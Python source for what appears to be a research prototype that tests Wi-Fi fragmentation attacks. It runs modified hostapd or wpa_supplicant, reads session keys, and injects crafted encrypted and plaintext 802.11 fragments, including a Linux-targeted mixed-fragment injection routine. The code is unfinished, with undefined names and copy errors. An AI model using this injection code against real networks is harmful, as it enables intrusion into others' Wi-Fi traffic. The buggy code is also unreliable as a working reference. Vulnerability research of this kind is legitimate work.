#!/usr/bin/env python3
from libwifi import *
import abc, sys, socket, struct, time, subprocess, atexit, select
from wpaspy import Ctrl
from scapy.contrib.wpa_eapol import WPA_key

# NOTES:
# - The ath9k_htc devices by default overwrite the injected sequence number.
#   However, this number is not incremented when the MoreFragments flag is set,
#   meaning we can inject fragmented frames (albeit with a different sequence
#   number than then one we use for injection this this script).
#   TODO: The above cannot be relied on when other frames and send between
#	  the two fragments?
# - Overwriting the sequence can be avoided by patching `ath_tgt_tx_seqno_normal`
#   and commenting out the two lines that modify `i_seq`.
# - See also the comment in Station.inject_next_frags to avoid other bugs with
#   ath9k_htc when injecting frames with the MF flag and while being in AP mode.

#MAC_STA2 = "d0:7e:35:d9:80:91"
#MAC_STA2 = "20:16:b9:b2:73:7a"
MAC_STA2 = "80:5a:04:d4:54:c4"

# ---------- Utility Commands ----------

def wpaspy_clear_messages(ctrl):
	# Clear old replies and messages from the hostapd control interface. This is not
	# perfect and there may be new unrelated messages after executing this code.
	while ctrl.pending():
		ctrl.recv()

def wpaspy_command(ctrl, cmd):
	wpaspy_clear_messages(ctrl)
	rval = ctrl.request(cmd)
	if "UNKNOWN COMMAND" in rval:
		log(ERROR, "wpa_supplicant did not recognize the command %s. Did you (re)compile wpa_supplicant?" % cmd.split()[0])
		quit(1)
	elif "FAIL" in rval:
		log(ERROR, "Failed to execute command %s" % cmd)
		quit(1)
	return rval

def argv_pop_argument(argument):
	if not argument in sys.argv: return False
	idx = sys.argv.index(argument)
	del sys.argv[idx]
	return True


class TestOptions():
	# 1. ============================================================
	# 1.1 Encrypted (= sanity ping test)
	# 1.2 Plaintext (= text plaintext injection)
	# 1.3 Encrpted, Encrypted
	# 1.4 [TKIP] Encrpted, Encrypted, no global MIC
	# 1.5 Plaintext, plaintext
	# 1.6 Encrypted, plaintext
	# 1.7 Plaintext, encrypted
	# 1.8 Encrypted, plaintext, encrypted
	# 1.9 Plaintext, encrypted, plaintext
	# 2. Test 2 but first plaintext sent before installing key
	Inject_Ping, ForceFrag_EAPOL, Inject_LargeFrag, Attack_LinuxInject, Inject_Frag = range(5)

	def __init__(self):
		self.test = None
		self.interface = None
		self.tx_before_auth = False


class MetaFrag():
	# StartingAuth, AfterAuthRace
	BeforeAuth, BeforeAuthDone, AfterAuth, AfterConnected = range(4)

	def __init__(self, frag, trigger, encrypted, inc_pn=1):
		self.frag = frag
		self.trigger = trigger
		self.encrypted = encrypted
		self.inc_pn = inc_pn

class TestCase():
	"""Currently this is mainly to test ping replies"""
	def __init__(self):
		self.fragments = []

	def next_trigger_is(self, trigger):
		if len(self.fragments) == 0:
			return False
		return self.fragments[0].trigger == trigger

	def next(self):
		frag = self.fragments[0]
		del self.fragments[0]
		return frag

class Station():
	INIT, ATTACKING, DONE = range(3)

	def __init__(self, daemon, mac, ds_status):
		self.daemon = daemon
		self.options = daemon.options
		self.state = Station.INIT
		self.txed_before_auth = False
		self.txed_before_auth_done = False
		self.is_connected = False

		self.tk = None
		# TODO: Get the current PN from the kernel, increment by 0x99,
		# and use that to inject packets. Causes less interference.
		# Though perhaps causing interference might be good...
		self.pn = 0x8000000
		self.gtk = None
		self.gtk_idx = None

		# Contains either the "to-DS" or "from-DS" flag.
		self.FCfield = Dot11(FCfield=ds_status).FCfield

		# MAC address and IP of the station that our script controls.
		# Can be either an AP or client.
		self.mac = mac
		self.ip = None

		# MAC address and IP of the peer station.
		# Can be either an AP or client.
		self.peermac = None
		self.peerip = None

		# To test frame forwarding to a 3rd party
		self.othermac = None
		self.otherip = None


	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		if self.state == Station.ATTACKING and self.options.test == TestOptions.Inject_Ping:
			# TODO XXX --- Make sure this is not a packet send by us!
			if ARP in p and p[ARP].pdst == self.ip:
				log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
				self.state = Station.DONE

	def set_header(self, p, forward=False, prior=None):
		"""Set addresses to send frame to the peer or the 3rd party station."""
		# Forward request only makes sense towards the DS/AP
		assert (not forward) or ((p.FCfield & 1) == 0)
		# Priority is only supported in data frames
		assert (prior == None) or (p.type == 2)

		p.FCfield |= self.FCfield
		if prior:
			p.subtype = 8
			p.add_payload(Dot11QoS(TID=prior))

		destmac = self.othermac if forward else self.peermac
		p.addr1 = self.peermac
		p.addr2 = self.mac
		# Here p.FCfield & 1 tests if to-DS is set. Then this fields
		# represents the final destination. Otherwise its the BSSID.
		p.addr3 = destmac if p.FCfield & 1 else self.mac


	def fragattack_linux(self):
		assert self.tk

		payload1 = b"A" * 16
		payload2 = b"B" * 16
		payload3 = b"C" * 16
		seqnum = 0x8000000

		# Frame 1: encrypted normal fragment
		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(payload1)
		self.set_header(frag1)
		frag1 = encrypt_ccmp(frag1, self.tk, self.pn)
		self.pn += 1

		# Frame 2: encrypted fragment with different CS but incremental PN.
		#	   sent fragmented to prevent receiving from processing it.
		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(payload2)
		self.set_header(frag1)
		frag2 = encrypt_ccmp(frag2, self.tk, self.pn)
		self.pn += 1

		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(payload3)
		self.set_header(frag1)

		for frag in [frag1, frag2, frag3]:
			self.daemon.inject_mon(frag)

	def create_fragments(self, header, data, num_frags):
		data = raw(data)
		fragments = []
		fragsize = (len(data) + 1) // num_frags
		for i in range(num_frags):
			frag = header.copy()
			frag.SC |= i
			if i < num_frags - 1:
				frag.FCfield |= Dot11(FCfield="MF").FCfield

			payload = data[fragsize * i : fragsize * (i + 1)]
			frag = frag/Raw(payload)
			fragments.append(frag)

		return fragments

	def encrypt(self, frame, inc_pn=1):
		key, keyid = (self.tk, 0) if int(frame.addr1[1], 16) & 1 == 0 else (self.gtk, self.gtk_idx)
		encrypted = encrypt_ccmp(frame, key, self.pn, keyid)
		self.pn += inc_pn
		return encrypted

	def send_fragmented(self, header, data, num_frags, tx_repeats=2):
		frags = self.create_fragments(header, data, num_frags)
		frags = [self.encrypt(p, inc_pn=1) for i, p in enumerate(frags) \
				if self.tk and i < 20]
		for i in range(tx_repeats):
			for frag in frags:
				self.daemon.inject_mon(frag)

	def inject_fragments(self, num_frags=3, size=3000, data=None, prior=None):
		if data is None:
			data = b"A" * size

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=prior)
		self.send_fragmented(header, data, num_frags)

	def inject_eapol(self, numbytes=16, forward=False):
		# This test is supposed to be executed before authenticating with the AP
		assert self.tk == None

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, forward)
		data = raw(LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A" * num_bytes))
		self.send_fragmented(header, data, num_frags=1, tx_repeats=2)

	def set_preconnect_info(self, ip, peerip):
		self.ip = ip
		self.peerip = peerip

	def handle_connecting(self, peermac):
		self.peermac = peermac

		seqnum = 0xAA
		header = Dot11(type="Data", SC=(seqnum << 4))
		self.set_header(header, prior=2)

		#request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)
		request = LLC()/SNAP()/EAPOL()/EAP()/Raw(b"A"*32)
		frag1, frag2 = self.create_fragments(header, data=request, num_frags=2)

		frag1copy, frag2copy = self.create_fragments(header, data=request, num_frags=2)
		frag1copy.addr1 = "ff:ff:ff:ff:ff:ff"
		frag2copy.addr1 = "ff:ff:ff:ff:ff:ff"

		# We can now generate the tests --- XXX do this based on the options
		# TODO: Against Windows 10 / Intel this fails. It seems we cannot interleave
		#	transmission of fragments of different priority. We should add a test
		#	case to check if the receiver supports interleaved priority reception.
		self.test = TestCase()
		#self.test.fragments.append(MetaFrag(frag1, MetaFrag.BeforeAuthDone, False))
		#self.test.fragments.append(MetaFrag(frag2copy, MetaFrag.BeforeAuthDone, False))
		#self.test.fragments.append(MetaFrag(frag2copy, MetaFrag.AfterAuth, False))
		self.test.fragments.append(MetaFrag(header/LLC()/SNAP()/IP()/ICMP(), MetaFrag.AfterAuth, False))
		#self.test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
		log(STATUS, "Constructed test case")

		"""
		if False == "handle_eapol_tx":
			# Send the first plaintext fragment before authenticating
			if self.options.tx_before_auth and not self.txed_before_auth:
				# XXX inject the frame
				self.txed_before_auth = True

			# Test if we can send large EAPOL to force fragmentation through the AP
			elif self.options == TestOptions.ForceFrag_EAPOL:
				self.inject_eapol(numbytes=32, forward=False)

		if False == "handle_connected":
			if self.options.test == TestOptions.Inject_Ping:
				log(STATUS, "self.mac: " + self.mac)
				log(STATUS, "self.ip: " + self.ip)
				log(STATUS, "self.peermac: " + self.peermac)
				log(STATUS, "self.peerip: " + self.peerip)
				request = ARP(op=1, hwsrc=self.mac, psrc=self.ip, hwdst=self.peermac, pdst=self.peerip)

				self.inject_fragments(num_frags=1, data=LLC()/SNAP()/request, prior=2)
				#self.daemon.inject_eth(Ether(src=self.mac, dst=self.peermac)/request)

				self.state = Station.ATTACKING
				log(STATUS, "Transmitted ARP request")
			#if self.options.test == TestOptions.Inject_Frag:
			#	self.inject_fragments(num_frags=1, size=16)
			#elif self.options == TestOptions.Inject_LargeFrag:
			#	self.inject_fragments(num_frags=3, size=3000)
		"""


	def inject_next_frags(self, trigger):
		frag = None

		while self.test.next_trigger_is(trigger):
			metafrag = self.test.next()
			if metafrag.encrypted:
				assert self.tk != None and self.gtk != None
				frag = self.encrypt(metafrag.frag, inc_pn=metafrag.inc_pn)
			else:
				frag = metafrag.frag
			self.daemon.inject_mon(frag)
			print("[Injected fragment]", repr(frag))

		# With ath9k_htc devices, there's a bug when injecting a frame with the
		# More Fragments (MF) field *and* operating the interface in AP mode
		# while the target is connected. For some reason, after injecting the
		# frame, it halts the transmission of all other normal frames (this even
		# includes beacons). Injecting a dummy packet like below avoid this,
		# and assures packets keep being sent normally (when the last fragment
		# had the MF flag set).
		if frag != None and frag.FCfield & 0x4 != 0:
			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")

	def handle_eapol_tx(self, eapol):
		eapol = EAPOL(eapol)
		key_type   = eapol.key_info & 0x0008
		key_ack    = eapol.key_info & 0x0080
		key_mic    = eapol.key_info & 0x0100
		key_secure = eapol.key_info & 0x0200
		# Detect Msg3/4 assumig WPA2 is used --- XXX support WPA1 as well
		is_msg3_or_4 = key_secure != 0

		# Inject any fragments before authenticating
		if not self.txed_before_auth:
			log(STATUS, "MetaFrag.BeforeAuth", color="green")
			self.inject_next_frags(MetaFrag.BeforeAuth)
			self.txed_before_auth = True
		# Inject any fragments when almost done authenticating
		elif is_msg3_or_4 and not self.txed_before_auth_done:
			log(STATUS, "MetaFrag.BeforeAuthDone", color="green")
			self.inject_next_frags(MetaFrag.BeforeAuthDone)
			self.txed_before_auth_done = True

		# - Send over monitor interface to assure order compared to injected fragments.
		# - This is also important because the station might have already installed the
		#   key before this script can send the EAPOL frame over Ethernet.
		# - Send with high priority, otherwise MetaFrag.AfterAuth might be send before
		#   the EAPOL frame by the Wi-Fi chip.
		p = Dot11(type="Data", subtype=8)/Dot11QoS(TID=6)/LLC()/SNAP()/eapol
		self.set_header(p)
		if self.tk: p = self.encrypt(p)
		daemon.inject_mon(p)
		print(repr(p))

		# handshake has normally completed, get the keys and inject
		if is_msg3_or_4:
			log(STATUS, "MetaFrag.AfterAuth", color="green")
			self.tk = self.daemon.get_tk(self)
			self.gtk, self.gtk_idx = self.daemon.get_gtk()
			self.inject_next_frags(MetaFrag.AfterAuth)

	def handle_authenticated(self):
		"""Called after completion of the 4-way handshake or similar"""

	def handle_connected(self, ip, peerip):
		"""Called once the station is fully connected and all IP addresses are known"""
		self.is_connected = True
		self.ip = ip
		self.peerip = peerip

		self.inject_next_frags(MetaFrag.AfterConnected)


class Daemon():
	def __init__(self, options):
		self.options = options

		# Note: some kernels don't support interface names of 15+ characters
		self.nic_iface = options.interface
		self.nic_mon = "mon" + self.nic_iface[:12]

		self.process = None
		self.sock_eth = None
		self.sock_mon = None

	@abc.abstractmethod
	def start_daemon(self):
		pass

	def configure_daemon(self):
		pass

	def handle_mon_rx(self, p):
		pass

	def handle_eth_rx(self, p):
		pass

	@abc.abstractmethod
	def get_tk(self, station):
		pass

	def get_gtk(self):
		gtk, idx = wpaspy_command(self.wpaspy_ctrl, "GET_GTK").split()
		return bytes.fromhex(gtk), int(idx)

	# TODO: Might be good to put this into libwifi?
	def configure_interfaces(self):
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")

		# 0. Some users may forget this otherwise
		subprocess.check_output(["rfkill", "unblock", "wifi"])

		# 1. Remove unused virtual interfaces to start from a clean state
		subprocess.call(["iw", self.nic_mon, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_iface, "interface", "add", self.nic_mon, "type", "monitor"])
		# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
		# sequence of commands assures the virtual interface is properly registered as a 802.11 monitor interface.
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		time.sleep(0.5)
		subprocess.check_output(["iw", self.nic_mon, "set", "type", "monitor"])
		subprocess.check_output(["ifconfig", self.nic_mon, "up"])

	def inject_mon(self, p):
		self.sock_mon.send(p)

	def inject_eth(self, p):
		self.sock_eth.send(p)

	def run(self):
		self.configure_interfaces()
		self.start_daemon()
		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_mon)
		self.sock_eth = L2Socket(type=ETH_P_ALL, iface=self.nic_iface)

		# Open the wpa_supplicant or hostapd control interface
		try:
			self.wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + self.nic_iface)
			self.wpaspy_ctrl.attach()
		except:
			log(ERROR, "It seems wpa_supplicant/hostapd did not start properly, please inspect its output.")
			log(ERROR, "Did you disable Wi-Fi in the network manager? Otherwise it won't start properly.")
			raise

		# XXX --- Move to Hostapd --- Configure things for the specific test we are running
		if self.options.test == TestOptions.ForceFrag_EAPOL or self.options.tx_before_auth:
			# Intercept EAPOL packets that the client wants to send
			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
		self.configure_daemon()

		# Monitor the virtual monitor interface of the client and perform the needed actions
		while True:
			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 1)
			if self.sock_mon in sel[0]:
				p = self.sock_mon.recv()
				if p != None: self.handle_mon_rx(p)

			if self.sock_eth in sel[0]:
				p = self.sock_eth.recv()
				if p != None and Ether in p: self.handle_eth_rx(p)

			if self.wpaspy_ctrl.s in sel[0]:
				msg = self.wpaspy_ctrl.recv()
				self.handle_wpaspy(msg)

	def stop(self):
		log(STATUS, "Closing Hostap daemon and cleaning up ...")
		if self.process:
			self.process.terminate()
			self.process.wait()
		if self.sock_eth: self.sock_eth.close()
		if self.sock_mon: self.sock_mon.close()


class Authenticator(Daemon):
	def __init__(self, options):
		super().__init__(options)

		self.apmac = None
		self.sock_eth = None
		self.dhcp = None
		self.arp_sender_ip = None
		self.arp_sock = None
		self.stations = dict()

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
		return bytes.fromhex(tk)

	def handle_eth_rx(self, p):
		# Ignore clients not connected to the AP
		clientmac = p[Ether].src
		if not clientmac in self.stations:
			return

		# Let clients get IP addresses
		self.dhcp.reply(p)
		self.arp_sock.reply(p)

		# Raise event when client is assigned an IP address
		station = self.stations[clientmac]
		if DHCP in p and not station.is_connected and clientmac in self.dhcp.leases:
			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
			# This assures we only mark it was connected after receiving a DHCP Request
			if req_type == 3:
				# TODO: We should wait a bit until the peer received the DHCP Ack ...
				peerip = self.dhcp.leases[clientmac]
				log(STATUS, "Client %s with IP %s has connected" % (clientmac, peerip))
				station.handle_connected(self.arp_sender_ip, peerip)

		station.handle_eth_rx(p)

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "AP-STA-CONNECTING" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				# Already pre-allocate an IP for this client
				clientip = self.dhcp.prealloc_ip(clientmac)

				station = Station(self, self.apmac, "from-DS")
				station.set_preconnect_info(self.arp_sender_ip, clientip)
				self.stations[clientmac] = station

			log(STATUS, "Client %s is connecting" % clientmac)
			station = self.stations[clientmac]
			station.handle_connecting(clientmac)

		elif "EAPOL-TX" in msg:
			cmd, clientmac, payload = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Sending EAPOL to unknown client %s." % clientmac)
				return
			self.stations[clientmac].handle_eapol_tx(bytes.fromhex(payload))

		elif "AP-STA-CONNECTED" in msg:
			cmd, clientmac = msg.split()
			if not clientmac in self.stations:
				log(WARNING, "Unknown client %s finished authenticating." % clientmac)
				return
			self.stations[clientmac].handle_authenticated()

	def start_daemon(self):
		log(STATUS, "Starting hostapd ...")
		try:
			self.process = subprocess.Popen([
				"../hostapd/hostapd",
				"-i", self.nic_iface,
				"hostapd.conf", "-dd"
			])
			time.sleep(1)
		except:
			if not os.path.exists("../hostapd/hostapd"):
				log(ERROR, "hostapd executable not found. Did you compile hostapd?")
			raise

		self.apmac = scapy.arch.get_if_hwaddr(self.nic_iface)

	def configure_daemon(self):
		# Let scapy handle DHCP requests
		self.dhcp = DHCP_sock(sock=self.sock_eth,
						domain='mathyvanhoef.com',
						pool=Net('192.168.100.0/24'),
						network='192.168.100.0/24',
						gw='192.168.100.254',
						renewal_time=600, lease_time=3600)
		# Configure gateway IP: reply to ARP and ping requests
		subprocess.check_output(["ifconfig", self.nic_iface, "192.168.100.254"])

		# Use a dedicated IP address for our ARP ping and replies
		self.arp_sender_ip = self.dhcp.pool.pop()
		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.arp_sender_ip, ARP_addr=self.apmac)
		log(STATUS, "Will inject ARP packets using sender IP %s" % self.arp_sender_ip)


class Supplicant(Daemon):
	def __init__(self, options):
		super().__init__(options)
		self.station = None

	def get_tk(self, station):
		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
		if tk == "none":
			raise Exception("Couldn't retrieve session key of client")
		else:
			return bytes.fromhex(tk)

	def handle_eth_rx(self, p):
		# TODO XXX --- Also handle ARP replies?

		# TODO XXX --- Raise connected event when we are assigned an IP address
		#self.station.handle_connected()

		# TODO XXX --- Request IP address on first connect, remember it, then reconnect

		pass

	def handle_wpaspy(self, msg):
		log(STATUS, "daemon: " + msg)

		if "Trying to authenticate with" in msg:
			p = re.compile("Trying to authenticate with (.*) \(SSID")
			peermac = p.search(msg).group(1)
			# XXX on second connect call station.set_preconnect_info(self.arp_sender_ip, clientip)
			self.station.handle_connecting(peermac)

		elif "CTRL-EVENT-CONNECTED" in msg:
			self.station.handle_authenticated()

			# TODO: Create a timer in case retransmissions are needed
			req = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")
			req = dhcp/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
			self.sock_eth.send(req)

		elif "EAPOL-TX" in msg and self.options.test == TestOptions.ForceFrag_EAPOL:
			# TODO XXX: Get the EAPOL message and send it ourselves (after injecting attack)
			self.station.handle_eapol_tx(bytes.fromhex(msg.split()[1]))

	def start_daemon(self):
		log(STATUS, "Starting wpa_supplicant ...")
		try:
			self.process = subprocess.Popen([
				"../wpa_supplicant/wpa_supplicant",
				"-Dnl80211",
				"-i", self.nic_iface,
				"-cclient.conf",
				"-dd"])
			time.sleep(1)
		except:
			if not os.path.exists("../wpa_supplicant/wpa_supplicant"):
				log(ERROR, "wpa_supplicant executable not found. Did you compile wpa_supplicant?")
			raise

		clientmac = scapy.arch.get_if_hwaddr(self.nic_iface)
		self.station = Station(self, clientmac, "to-DS")


def cleanup():
	daemon.stop()


if __name__ == "__main__":
	if "--help" in sys.argv or "-h" in sys.argv:
		print("\nSee README.md for usage instructions.")
		quit(1)

	options = TestOptions()
	options.interface = sys.argv[1]

	if False:
		# Parse the type of test variant to execute
		start_ap = argv_pop_argument("--ap")
		force_frag = argv_pop_argument("--force-frag")
		inject_largefrag = argv_pop_argument("--largefrag")
		attack_linux = argv_pop_argument("--attack-linux")
		if force_frag + inject_largefrag + attack_linux > 1:
			print("You can only select one test")
			quit(1)
		if force_frag:
			options.test = TestOptions.ForceFrag_EAPOL
		elif inject_largefrag:
			options.test = TestOptions.Inject_LargeFrag
		elif attack_linux:
			options.test = TestOptions.Attack_LinuxInject
		else:
			options.test = TestOptions.Inject_Frag

		# Parse remaining options
		while argv_pop_argument("--debug"):
			libwifi.global_log_level -= 1

	else:
		options.test = TestOptions.Inject_Ping
		options.tx_before_auth = True
		start_ap = True

	# Now start the tests
	if start_ap:
		daemon = Authenticator(options)
	else:
		daemon = Supplicant(options)
	atexit.register(cleanup)
	daemon.run()

